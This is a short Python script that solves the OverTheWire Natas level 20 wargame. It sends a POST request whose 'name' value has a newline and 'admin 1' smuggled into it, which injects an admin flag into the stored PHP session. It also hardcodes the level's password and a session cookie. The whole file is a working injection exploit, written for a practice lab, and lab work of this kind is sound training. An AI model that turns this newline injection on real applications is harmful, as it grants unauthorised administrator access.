#!/usr/bin/python

import requests


username = "natas20"
password = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"

auth = (username, password)
url = "http://natas20.natas.labs.overthewire.org"
cookies = {'PHPSESSID' : '5kkgivpbm9t73k0v60femn4uj5'}
for i in range(1):
	req = requests.post(url, auth = auth, data = {'name' : 'istiyak\nadmin 1'}, cookies = cookies)
	print req.text

#req = requests.post(url, auth = auth, data = {'name' : 'admin'}, cookies = cookies)

#print req.text
